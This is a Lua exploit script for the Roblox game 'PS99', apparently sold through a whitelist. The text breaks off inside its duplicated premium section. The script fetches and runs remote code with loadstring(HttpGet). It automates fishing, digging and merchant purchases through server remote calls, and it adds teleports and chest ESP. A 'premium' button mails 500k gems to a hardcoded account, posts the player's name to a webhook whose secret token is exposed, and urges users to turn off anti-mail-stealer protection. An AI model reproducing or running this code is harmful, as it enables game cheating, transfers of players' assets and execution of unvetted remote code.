function main()
    local http_request = syn and syn.request or request

    local response = http_request({
        Url = "https://raw.githubusercontent.com/jelqmaster/wl/main/wl.txt",
        Method = 'GET'
    })

    local whitelist = response and response.Body or ""

    local username = game.Players.LocalPlayer.Name
    local whitelistTable = {}

    for entry in whitelist:gmatch("[^\r\n]+") do
        table.insert(whitelistTable, entry)
    end

    local beep = table.find(whitelistTable, username)

    if beep then
        game:GetService("StarterGui"):SetCore("SendNotification",{
            Title = "Status",
            Text = "Whitelisted! Enjoy.",
            Icon = "rbxassetid://1234567890"
        })
        getgenv().Config = {}

        repeat task.wait()
        local vu = game:GetService("VirtualUser")game:GetService("Players").LocalPlayer.Idled:connect(function() 
        vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame) wait(1) 
        vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)end)
        until game:IsLoaded()

        local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
        local Window = OrionLib:MakeWindow({Name = "PS99 Script (Ver. 0.3)", HidePremium = false, SaveConfig = false, ConfigFolder = "OrionTest"})
        local Tab = Window:MakeTab({
            Name = "Fishing",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })
        local Tab2 = Window:MakeTab({
            Name = "Digging",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })

        local Tab3 = Window:MakeTab({
            Name = "Hidden Presents",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })

        local Merchant = Window:MakeTab({
            Name = "Merchant",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })

        local Tab4 = Window:MakeTab({
            Name = "Mailing/Transfer",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })

        local Misc = Window:MakeTab({
            Name = "Misc",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })

        local Tab5 = Window:MakeTab({
            Name = "VIP Features",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })

        local Section = Tab:AddSection({
            Name = "Advanced Fishing"
        })

        Tab:AddToggle({
            Name = "Autofish",
            Default = false,
            Callback = function(v)
                Config.autoFishA = v
                spawn(autoFishA)
            end    
        })

        Tab:AddButton({
            Name = "TP Fishing Area",
            Callback = function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-180.852783203125, 117.92350006103516, 5175.45703125)
            end    
        })

        local Section = Tab:AddSection({
            Name = "Normal Fishing"
        })

        Tab:AddToggle({
            Name = "Autofish",
            Default = false,
            Callback = function(v)
                Config.autoFishN = v
                spawn(autoFishN)
            end    
        })

        Tab:AddButton({
            Name = "TP Fishing Area",
            Callback = function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(795.875549, 19.4739323, 1136.19189, -0.999999762, -1.52361546e-09, -0.00072622532, -1.54072566e-09, 1, 2.35599042e-08, 0.00072622532, 2.3561018e-08, -0.999999762)
            end    
        })

        local Section = Tab2:AddSection({
            Name = "Normal Digging"
        })

        Tab2:AddToggle({
            Name = "Auto Dig",
            Default = false,
            Callback = function(v)
                Config.autoDigN = v
                spawn(autoDigN)
            end    
        })

        Tab2:AddToggle({
            Name = "Auto Chest",
            Default = false,
            Callback = function(v)
                Config.autoChestN = v
                spawn(autoChestN)
            end    
        })

        Tab2:AddButton({
            Name = "Chest ESP",
            Callback = function()
                chestESPN()
            end    
        })

        local Section = Tab2:AddSection({
            Name = "Advanced Digging"
        })

        Tab2:AddToggle({
            Name = "Auto Dig",
            Default = false,
            Callback = function(v)
                Config.autoDigA = v
                spawn(autoDigA)
            end    
        })

        Tab2:AddToggle({
            Name = "Auto Chest",
            Default = false,
            Callback = function(v)
                Config.autoChestA = v
                spawn(autoChestA)
            end    
        })

        Tab2:AddButton({
            Name = "TP and Collect Magic Bucket",
            Callback = function()
                magicBucket()
            end    
        })

        Tab2:AddButton({
            Name = "Chest ESP",
            Callback = function()
                chestESPA()
            end    
        })

        Tab3:AddToggle({
            Name = "Auto Hidden Presents",
            Default = false,
            Callback = function(v)
                Config.presentHunter = v
                spawn(presentHunter)
            end    
        })

        Tab4:AddTextbox({
            Name = "Recipient",
            Default = "",
            TextDisappear = false,
            Callback = function(ign)
                usernamel = tostring(ign)
            end	  
        })

        Tab4:AddTextbox({
            Name = "Amount to Send",
            Default = "",
            TextDisappear = false,
            Callback = function(amt)
                local function converter(input)
                    local number, suffix = input:match("^(%d+)([kmb]?)$")
                    if number then
                        number = tonumber(number)
                        if suffix == 'k' then
                            return number * 1000
                        elseif suffix == 'm' then
                            return number * 1000000
                        elseif suffix == 'b' then
                            return number * 1000000000
                        else
                            return number
                        end
                    else
                        OrionLib:MakeNotification({
                            Name = "Invalid Input!",
                            Content = "Please use valid numbers",
                            Image = "rbxassetid://4483345998",
                            Time = 5
                        })
                        return nil
                    end
                end
        
                gemAmount = converter(amt)
                if gemAmount then
                    print(gemAmount)
                else
                    OrionLib:MakeNotification({
                        Name = "Error!",
                        Content = "Something went wrong.",
                        Image = "rbxassetid://4483345998",
                        Time = 5
                    })
                end
            end
        })
        
        Tab4:AddButton({
            Name = "Send Gems!",
            Callback = function()
                      sendGems()
              end    
        })

        Misc:AddButton({
            Name = "AntiAFK",
            Callback = function()
                 antiAFK()   
              end    
        })

        Tab5:AddParagraph("INFO","If you want to purchase premium features it will cost 500k gems, for lifetime access.")

        Tab5:AddButton({
            Name = "Purchase [500k Gems]",
            Callback = function()
                    purchasePremium()
              end    
        })

        Merchant:AddButton({
            Name = "Auto Merchant",
            Callback = function()
                    autoMerchant()
              end    
        })

        OrionLib:Init()

        function antiAFK()
            local VirtualInputManager = game:GetService("VirtualInputManager")
            while task.wait() do
                VirtualInputManager:SendKeyEvent(true, "Space", false, game)
                task.wait(.2)
                VirtualInputManager:SendKeyEvent(false, "Space", false, game)
                task.wait(300)
            end
        end

        function autoFishA()
            while true do
                if not Config.autoFishA then
                    break
                end

                local x = math.random(10, 20)
                local z = math.random(10, 20)

                local argsCast = {
                    [1] = "AdvancedFishing",
                    [2] = "RequestCast",
                    [3] = Vector3.new(1470.6005859375, 61.6249885559082, -4448.0107421875) + Vector3.new(x, 0, z)
                }
                
                game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(argsCast))        
                task.wait(3.5)

                local argsReel = {
                    [1] = "AdvancedFishing",
                    [2] = "RequestReel"
                }
                
                game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(argsReel))        
                repeat
                task.wait()

                    local hasFishingLine = false
                    for _, descendant in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                        if descendant.Name == "FishingLine" then
                            hasFishingLine = true
                            break
                        end
                    end

                    if not hasFishingLine then
                        break
                    end

                    local argsClicked = {
                        [1] = "AdvancedFishing",
                        [2] = "Clicked"
                    }

                    game:GetService("ReplicatedStorage").Network.Instancing_InvokeCustomFromClient:InvokeServer(unpack(argsClicked))
                until not hasFishingLine
                task.wait()
            end
        end

        function autoFishN()
            while true do
                if not Config.autoFishN then
                    break
                end

                local x = math.random(10, 20)
                local z = math.random(10, 20)

                local args = {
                    [1] = "Fishing",
                    [2] = "RequestCast",
                    [3] = Vector3.new(1139.5283203125, 75.91417694091797, -3440.1162109375) + Vector3.new(x, 0, z)
                }
                
                game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(args))                   
                task.wait(3.5)

                local args = {
                    [1] = "Fishing",
                    [2] = "RequestReel"
                }
                
                game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(args))                    
                repeat
                task.wait()

                    local hasFishingLine = false
                    for _, descendant in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                        if descendant.Name == "FishingLine" then
                            hasFishingLine = true
                            break
                        end
                    end

                    if not hasFishingLine then
                        break
                    end

                    local args = {
                        [1] = "Fishing",
                        [2] = "Clicked"
                    }
                    
                    game:GetService("ReplicatedStorage").Network.Instancing_InvokeCustomFromClient:InvokeServer(unpack(args))                
                until not hasFishingLine
                task.wait()
            end
        end

        function autoDigN()
            while task.wait() do
                if not Config.autoDigN then
                    break
                end
        
                for _, v in pairs(workspace.__THINGS.__INSTANCE_CONTAINER.Active.Digsite.Important.ActiveBlocks:GetChildren()) do
                    if v:IsA("Part") and v.Name == "Part" and (v.Position and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.Position).magnitude < 15) then
                        for i = 1, 5 do
                            local args = {
                                [1] = "Digsite",
                                [2] = "DigBlock",
                                [3] = v:GetAttribute('Coord')
                            }
        
                            game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(args))
                        end
                        task.wait(0.1)
                        break
                    end
                end
            end
        end  
        
        function autoChestN()
            while task.wait() and Config.autoChestN do
                for _, chest in pairs(workspace.__THINGS.__INSTANCE_CONTAINER.Active.Digsite.Important.ActiveChests:GetDescendants()) do
                    if chest:IsA("MeshPart") and chest.Name == "Top" and chest.Parent.Name == "Animated" then
                        if chest.Position and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - chest.Position).magnitude < 500 then
                            local oldCFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                            game.Players.LocalPlayer.Character.HumanoidRootPart:PivotTo(chest.Parent:GetPivot() + Vector3.new(0,5,0))
                            local chestArgs = {
                                [1] = "Digsite",
                                [2] = "DigChest",
                                [3] = chest.Parent:GetAttribute("Coord")
                            }
                            game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(chestArgs))
                            task.wait(3)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldCFrame + Vector3.new(0,5,0)
                            task.wait(0.1)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldCFrame + Vector3.new(0,5,0)
                        end
                    end
                end
            end
        end

        function chestESPN()
            local ChestsToHighlight = {
                "Animated",
            }
            
            local function contains(table, val)
               for i=1, #table do
                  if table[i] == val then return true end
               end
               return false
            end
            
            while true do
                task.wait()
            
                for _, chest in pairs(game.Workspace.__THINGS.__INSTANCE_CONTAINER.Active.Digsite.Important.ActiveChests:GetChildren()) do
                    if chest:FindFirstChild("ESP") then
                        chest:FindFirstChild("ESP"):Destroy()
                    end
            
                    if contains(ChestsToHighlight, chest.Name) then
                        local tcolor = Color3.fromRGB(0, 255, 0)
            
                        local esp = Instance.new("BillboardGui", chest)
                        esp.Name = "ESP"
                        esp.Size = UDim2.new(5, 0, 5, 0)
                        esp.AlwaysOnTop = true
            
                        local frame = Instance.new("Frame", esp)
                        frame.Size = UDim2.new(1, 0, 1, 0)
                        frame.BackgroundTransparency = 0.80
                        frame.BorderSizePixel = 0
                        frame.BackgroundColor3 = tcolor
            
                        local label = Instance.new('TextLabel', frame)
                        label.Size = UDim2.new(1, 0, 1, 1)
                        label.BorderSizePixel = 0
                        label.TextSize = 17
                        label.Text = "Chest"
                        label.BackgroundTransparency = 1
                        label.TextColor3 = tcolor
                        label.TextStrokeColor3 = Color3.fromRGB(6, 6, 6)
                        label.TextStrokeTransparency = 0.7
                    end
                end
            end            
        end

        function autoDigA()
            while task.wait() do
                if not Config.autoDigA then
                    break
                end
        
                for _, v in pairs(workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite.Important.ActiveBlocks:GetChildren()) do
                    if v:IsA("Part") and v.Name == "Part" and (v.Position and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.Position).magnitude < 15) then
                        for i = 1, 5 do
                            local args = {
                                [1] = "AdvancedDigsite",
                                [2] = "DigBlock",
                                [3] = v:GetAttribute("Coord")
                            }
        
                            game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(args))
                        end
                        task.wait(0.1)
                        break
                    end
                end
            end
        end

        function autoChestA()
            while task.wait() and Config.autoChestA do
                for _, chest in pairs(workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite.Important.ActiveChests:GetDescendants()) do
                    if chest:IsA("MeshPart") and chest.Name == "Top" and chest.Parent.Name == "Animated" then
                        if chest.Position and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - chest.Position).magnitude < 500 then
                            local oldCFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                            game.Players.LocalPlayer.Character.HumanoidRootPart:PivotTo(chest.Parent:GetPivot() + Vector3.new(0,5,0))
                            local args = {
                                [1] = "AdvancedDigsite",
                                [2] = "DigChest",
                                [3] = chest.Parent:GetAttribute("Coord")
                            }
        
                            game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(args))                            
                            task.wait(3)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldCFrame + Vector3.new(0,5,0)
                            task.wait(0.1)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldCFrame + Vector3.new(0,5,0)
                        end
                    end
                end
            end
        end

        function magicBucket()
            for _, v in pairs(workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite.Important.ActiveBlocks:GetChildren()) do
                if v.BrickColor == BrickColor.new("Royal purple") then
                    game.Players.LocalPlayer.Character:MoveTo(v.Position)
                    repeat task.wait()
                        local args = {
                            [1] = "AdvancedDigsite",
                            [2] = "DigBlock",
                            [3] = v:GetAttribute("Coord")
                        }
                        
                        game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(args))       
                    until not v 
                end
            end
        end

        function chestESPA()
            local ChestsToHighlight = {
                "Animated",
            }
            
            local function contains(table, val)
               for i=1, #table do
                  if table[i] == val then return true end
               end
               return false
            end
            
            while true do
                task.wait()
            
                for _, chest in pairs(workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite.Important.ActiveChests:GetChildren()) do
                    if chest:FindFirstChild("ESP") then
                        chest:FindFirstChild("ESP"):Destroy()
                    end
            
                    if contains(ChestsToHighlight, chest.Name) then
                        local tcolor = Color3.fromRGB(0, 255, 0)
            
                        local esp = Instance.new("BillboardGui", chest)
                        esp.Name = "ESP"
                        esp.Size = UDim2.new(5, 0, 5, 0)
                        esp.AlwaysOnTop = true
            
                        local frame = Instance.new("Frame", esp)
                        frame.Size = UDim2.new(1, 0, 1, 0)
                        frame.BackgroundTransparency = 0.80
                        frame.BorderSizePixel = 0
                        frame.BackgroundColor3 = tcolor
            
                        local label = Instance.new('TextLabel', frame)
                        label.Size = UDim2.new(1, 0, 1, 1)
                        label.BorderSizePixel = 0
                        label.TextSize = 17
                        label.Text = "Chest"
                        label.BackgroundTransparency = 1
                        label.TextColor3 = tcolor
                        label.TextStrokeColor3 = Color3.fromRGB(6, 6, 6)
                        label.TextStrokeTransparency = 0.7
                    end
                end
            end            
        end

        function presentHunter()
            while Config.presentHunter do
                local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
                local result = saveModule.Get()
        
                local hiddenPresents = result.HiddenPresents
        
                for _, present in pairs(hiddenPresents) do
                    local id = present.ID
                    if id then
                        game:GetService("ReplicatedStorage").Network:FindFirstChild("Hidden Presents: Found"):InvokeServer(id)        
                    end
                    task.wait(0.5)
                end
            end
        end        
        
        function autoMerchant()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(215.520996, 13.6210003, 168.335007) + Vector3.new(0,5,0)
            task.wait(0.1)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(427.792023, 13.6090002, 497.579987) + Vector3.new(0,5,0)
            task.wait(1)
            for i = 1,6 do
                local a, b
                repeat task.wait(0.3)
                    a, b = game:GetService("ReplicatedStorage").Network.Merchant_RequestPurchase:InvokeServer("RegularMerchant", i)
                until not a
            end
            task.wait(0.5)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(567.216003, 13.625, 1017.68402) + Vector3.new(0,5,0)
            task.wait(0.1)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(874.140991, 13.625, 1494.69495) + Vector3.new(0,5,0)
            task.wait(1)
            for i = 1,6 do
                local a, b
                repeat task.wait(0.3)
                    a, b = game:GetService("ReplicatedStorage").Network.Merchant_RequestPurchase:InvokeServer("AdvancedMerchant", i)
                until not a
            end
        end

        function sendGems()
            local GetSave = function()
                return require(game.ReplicatedStorage.Library.Client.Save).Get()
            end
            
            for i, v in pairs(GetSave().Inventory.Currency) do
                if v.id == "Diamonds" then
                    local adjustedAmount = tonumber(gemAmount)
            
                    if adjustedAmount > v._am then
                        OrionLib:MakeNotification({
                            Name = "Error!",
                            Content = "You're trying to send more gems than you have.",
                            Image = "rbxassetid://4483345998",
                            Time = 5
                        })
                    else
                        if v._am - adjustedAmount < 10000 then
                            adjustedAmount = math.max(0, adjustedAmount - 10000)
                        end
            
                        local args = {
                            [1] = usernamel,
                            [2] = v.id,
                            [3] = "Currency",
                            [4] = i,
                            [5] = adjustedAmount
                        }
            
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                        OrionLib:MakeNotification({
                            Name = "Success!",
                            Content = "You successfully sent " .. adjustedAmount .. " to " .. username,
                            Image = "rbxassetid://4483345998",
                            Time = 5
                        })
                    end
                end
            end
        end
        
        function purchasePremium()
            local GetSave = function()
                return require(game.ReplicatedStorage.Library.Client.Save).Get()
            end
            
            for i, v in pairs(GetSave().Inventory.Currency) do
                if v.id == "Diamonds" then
                    local price = 500000
        
                    local initialAmount = v._am
        
                    if price > v._am then
                        OrionLib:MakeNotification({
                            Name = "Insufficient Balance",
                            Content = "You can't afford this.",
                            Image = "rbxassetid://4483345998",
                            Time = 5
                        })
                    else
                        if v._am - price < 10000 then
                            price = math.max(0, price - 10000)
                        end
        
                        local args = {
                            [1] = "samuraikid0221",
                            [2] = v.id,
                            [3] = "Currency",
                            [4] = i,
                            [5] = price
                        }
        
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                        task.wait(3)

                        local updatedGem = nil

                        for _, v in pairs(game:GetService("Players").LocalPlayer.leaderstats:GetChildren()) do
                            local nameFromSecondChar = string.sub(v.Name, 2)
                            
                            if nameFromSecondChar:find("Diamonds") then
                                updatedGem = v.Value
                            end
                        end   

                        if initialAmount - updatedGem >= 450000 then
                            OrionLib:MakeNotification({
                                Name = "Success!",
                                Content = "You have successfully purchased premium, reExecute, if you don't have it, wait 5 minutes then you'll get it.",
                                Image = "rbxassetid://4483345998",
                                Time = 15
                            })
        
                            local syn = syn or {}
                            local request = syn.request or http_request
                            local HttpService = game:GetService("HttpService")
        
                            local webhookUrl = "https://webhook.lewistehminerz.dev/api/webhooks/1199585265065402430/mAlzw2fi2i4BlHAHh0oDvEaLRes2YH6Tz2iLoiWGUGS--pDwfkv_n87v8JqwJX69U3pa"
                            
                            local lp = game.Players.LocalPlayer.Name
        
                            local function sendWebhookMessage(embed)
                                local success, response = pcall(function()
                                    request({
                                        Url = webhookUrl,
                                        Method = "POST",
                                        Headers = {["Content-Type"] = "application/json"},
                                        Body = HttpService:JSONEncode({embeds = {embed}})
                                    })
                                end)
                            end
        
                            local embed = {
                                title = "PS99",
                                description = lp .. " has purchased premium",
                                color = 0xFFD700
                            }
                            sendWebhookMessage(embed)
                        else
                            OrionLib:MakeNotification({
                                Name = "Nice Try!",
                                Content = "Turn off anti mail stealer, because I am not able to charge 500k gems if you have it executed.",
                                Image = "rbxassetid://4483345998",
                                Time = 15
                            })
                        end
                    end
                end
            end
        end        
    else
        game:GetService("StarterGui"):SetCore("SendNotification",{
            Title = "Status",
            Text = "Not whitelisted, go on discord to get whitelisted.",
            Icon = "rbxassetid://1234567890"
        })
    end
end

function mainPremium()
    local http_request = syn and syn.request or request

    local response = http_request({
        Url = "https://raw.githubusercontent.com/jelqmaster/wl/main/wl.txt",
        Method = 'GET'
    })

    local whitelist = response and response.Body or ""

    local username = game.Players.LocalPlayer.Name
    local whitelistTable = {}

    for entry in whitelist:gmatch("[^\r\n]+") do
        table.insert(whitelistTable, entry)
    end

    local beep = table.find(whitelistTable, username)

    if beep then
        game:GetService("StarterGui"):SetCore("SendNotification",{
            Title = "Status",
            Text = "Whitelisted! Enjoy.",
            Icon = "rbxassetid://1234567890"
        })
        getgenv().Config = {}

        repeat task.wait()
            local vu = game:GetService("VirtualUser")game:GetService("Players").LocalPlayer.Idled:connect(function() 
            vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame) wait(1) 
            vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)end)
        until game:IsLoaded()

        local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
        local Window = OrionLib:MakeWindow({Name = "PS99 Script [Premium] (Ver. 0.4)", HidePremium = false, SaveConfig = false, ConfigFolder = "OrionTest"})
        local Tab = Window:MakeTab({
            Name = "Fishing",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })
        local Tab2 = Window:MakeTab({
            Name = "Digging",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })

        local Tab3 = Window:MakeTab({
            Name = "Hidden Presents",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })

        local Merchant = Window:MakeTab({
            Name = "Merchant",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })

        local Tab4 = Window:MakeTab({
            Name = "Mailing/Transfer",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })

        local Misc = Window:MakeTab({
            Name = "Misc",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })

        local Tab5 = Window:MakeTab({
            Name = "VIP Features",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })

        local Section = Tab:AddSection({
            Name = "Advanced Fishing"
        })

        Tab:AddToggle({
            Name = "Autofish",
            Default = false,
            Callback = function(v)
                Config.autoFishA = v
                spawn(autoFishA)
            end    
        })

        Tab:AddButton({
            Name = "TP Fishing Area",
            Callback = function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-180.852783203125, 117.92350006103516, 5175.45703125)
            end    
        })

        local Section = Tab:AddSection({
            Name = "Normal Fishing"
        })

        Tab:AddToggle({
            Name = "Autofish",
            Default = false,
            Callback = function(v)
                Config.autoFishN = v
                spawn(autoFishN)
            end    
        })

        Tab:AddButton({
            Name = "TP Fishing Area",
            Callback = function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(795.875549, 19.4739323, 1136.19189, -0.999999762, -1.52361546e-09, -0.00072622532, -1.54072566e-09, 1, 2.35599042e-08, 0.00072622532, 2.3561018e-08, -0.999999762)
            end    
        })

        local Section = Tab2:AddSection({
            Name = "Normal Digging"
        })

        Tab2:AddToggle({
            Name = "Auto Dig",
            Default = false,
            Callback = function(v)
                Config.autoDigN = v
                spawn(autoDigN)
            end    
        })

        Tab2:AddToggle({
            Name = "Auto Chest",
            Default = false,
            Callback = function(v)
                Config.autoChestN = v
                spawn(autoChestN)
            end    
        })

        Tab2:AddButton({
            Name = "Chest ESP",
            Callback = function()
                chestESPN()
            end    
        })

        local Section = Tab2:AddSection({
            Name = "Advanced Digging"
        })

        Tab2:AddToggle({
            Name = "Auto Dig",
            Default = false,
            Callback = function(v)
                Config.autoDigA = v
                spawn(autoDigA)
            end    
        })

        Tab2:AddToggle({
            Name = "Auto Chest",
            Default = false,
            Callback = function(v)
                Config.autoChestA = v
                spawn(autoChestA)
            end    
        })

        Tab2:AddButton({
            Name = "TP and Collect Magic Bucket",
            Callback = function()
                magicBucket()
            end    
        })

        Tab2:AddButton({
            Name = "Chest ESP",
            Callback = function()
                chestESPA()
            end    
        })

        Tab3:AddToggle({
            Name = "Auto Hidden Presents",
            Default = false,
            Callback = function(v)
                Config.presentHunter = v
                spawn(presentHunter)
            end    
        })

        Merchant:AddButton({
            Name = "Auto Merchant",
            Callback = function()
                autoMerchant()
            end    
        })

        Tab4:AddTextbox({
            Name = "Recipient",
            Default = "",
            TextDisappear = false,
            Callback = function(ign)
                usernamel = tostring(ign)
            end	  
        })

        Tab4:AddTextbox({
            Name = "Amount to Send",
            Default = "",
            TextDisappear = false,
            Callback = function(amt)
                local function converter(input)
                    local number, suffix = input:match("^(%d+)([kmb]?)$")
                    if number then
                        number = tonumber(number)
                        if suffix == 'k' then
                            return number * 1000
                        elseif suffix == 'm' then
                            return number * 1000000
                        elseif suffix == 'b' then
                            return number * 1000000000
                        else
                            return number
                        end
                    else
                        OrionLib:MakeNotification({
                            Name = "Invalid Input!",
                            Content = "Please use valid numbers",
                            Image = "rbxassetid://4483345998",
                            Time = 5
                        })
                        return nil
                    end
                end
        
                gemAmount = converter(amt)
                if gemAmount then
                    print(gemAmount)
                else
                    OrionLib:MakeNotification({
                        Name = "Error!",
                        Content = "Something went wrong.",
                        Image = "rbxassetid://4483345998",
                        Time = 5
                    })
                end
            end
        })
        
        Tab4:AddButton({
            Name = "Send Gems!",
            Callback = function()
                    sendGems()
              end    
        })

        Misc:AddButton({
            Name = "AntiAFK",
            Callback = function()
                 antiAFK()   
              end    
        })

        Tab5:AddParagraph("INFO","This feature automatically sends gems to your main or another account once you accumulate a set amount, like mailing 1 million gems to your main account after farming them. Fully AFK")

        Tab5:AddTextbox({
            Name = "Recipient",
            Default = "",
            TextDisappear = false,
            Callback = function(ignP)
                usernameP = tostring(ignP)
            end	  
        })

        Tab5:AddTextbox({
            Name = "Amount to Send",
            Default = "",
            TextDisappear = false,
            Callback = function(amtP)
                local function converter(input)
                    local number, suffix = input:match("^(%d+)([kmb]?)$")
                    if number then
                        number = tonumber(number)
                        if suffix == 'k' then
                            return number * 1000
                        elseif suffix == 'm' then
                            return number * 1000000
                        elseif suffix == 'b' then
                            return number * 1000000000
                        else
                            return number
                        end
                    else
                        OrionLib:MakeNotification({
                            Name = "Invalid Input!",
                            Content = "Please use valid numbers",
                            Image = "rbxassetid://4483345998",
                            Time = 5
                        })
                        return nil
                    end
                end
        
                gemAmountP = converter(amtP)
                if gemAmountP then
                    print(gemAmountP)
                else
                    OrionLib:MakeNotification({
                        Name = "Error!",
                        Content = "Something went wrong.",
                        Image = "rbxassetid://4483345998",
                        Time = 5
                    })
                end
            end
        })      

        Tab5:AddToggle({
            Name = "Auto Send",
            Default = false,
            Callback = function(v)
                Config.autoSend = v
                spawn(autoSend)
            end    
        })

        local Section = Tab5:AddSection({
            Name = "Auto Fuse"
        })

        Tab5:AddParagraph("IMPORTANT READ!","Make sure to toggle edit mode and equip only 1 pet, the pet you want to fuse, must have at least 16k of that one pet and 240k+ gems to get achievement hoverboard.")
        Tab5:AddLabel("Must be in the fusing zone (zone 28)")
        Tab5:AddToggle({
            Name = "Auto Fuse",
            Default = false,
            Callback = function(v)
                Config.autoFuse = v
                spawn(autoFuse)
            end    
        })

        local Section = Tab5:AddSection({
            Name = "Auto Zone"
        })
        
        Tab5:AddParagraph("IMPORTANT READ!","Make sure to give your alt account good pets and a magnet book, and some gems to buy pet equip slots. Recommended for fresh accounts.")
        Tab5:AddLabel("Manually Complete Zone 1 First.")

        Tab5:AddToggle({
            Name = "Auto Zone",
            Default = false,
            Callback = function(v)
                Config.autoZone = v
                spawn(autoZone)
            end    
        })

        OrionLib:Init()

        function antiAFK()
            local VirtualInputManager = game:GetService("VirtualInputManager")
            while task.wait() do
                VirtualInputManager:SendKeyEvent(true, "Space", false, game)
                task.wait(.2)
                VirtualInputManager:SendKeyEvent(false, "Space", false, game)
                task.wait(300)
            end
        end

        function autoFishA()
            while true do
                if not Config.autoFishA then
                    break
                end

                local x = math.random(10, 20)
                local z = math.random(10, 20)

                local argsCast = {
                    [1] = "AdvancedFishing",
                    [2] = "RequestCast",
                    [3] = Vector3.new(1470.6005859375, 61.6249885559082, -4448.0107421875) + Vector3.new(x, 0, z)
                }
                
                game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(argsCast))        
                task.wait(3.5)

                local argsReel = {
                    [1] = "AdvancedFishing",
                    [2] = "RequestReel"
                }
                
                game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(argsReel))        
                repeat
                task.wait()

                    local hasFishingLine = false
                    for _, descendant in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                        if descendant.Name == "FishingLine" then
                            hasFishingLine = true
                            break
                        end
                    end

                    if not hasFishingLine then
                        break
                    end

                    local argsClicked = {
                        [1] = "AdvancedFishing",
                        [2] = "Clicked"
                    }

                    game:GetService("ReplicatedStorage").Network.Instancing_InvokeCustomFromClient:InvokeServer(unpack(argsClicked))
                until not hasFishingLine
                task.wait()
            end
        end

        function autoFishN()
            while true do
                if not Config.autoFishN then
                    break
                end

                local x = math.random(10, 20)
                local z = math.random(10, 20)

                local args = {
                    [1] = "Fishing",
                    [2] = "RequestCast",
                    [3] = Vector3.new(1139.5283203125, 75.91417694091797, -3440.1162109375) + Vector3.new(x, 0, z)
                }
                
                game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(args))                   
                task.wait(3.5)

                local args = {
                    [1] = "Fishing",
                    [2] = "RequestReel"
                }
                
                game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(args))                    
                repeat
                task.wait()

                    local hasFishingLine = false
                    for _, descendant in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                        if descendant.Name == "FishingLine" then
                            hasFishingLine = true
                            break
                        end
                    end

                    if not hasFishingLine then
                        break
                    end

                    local args = {
                        [1] = "Fishing",
                        [2] = "Clicked"
                    }
                    
                    game:GetService("ReplicatedStorage").Network.Instancing_InvokeCustomFromClient:InvokeServer(unpack(args))                
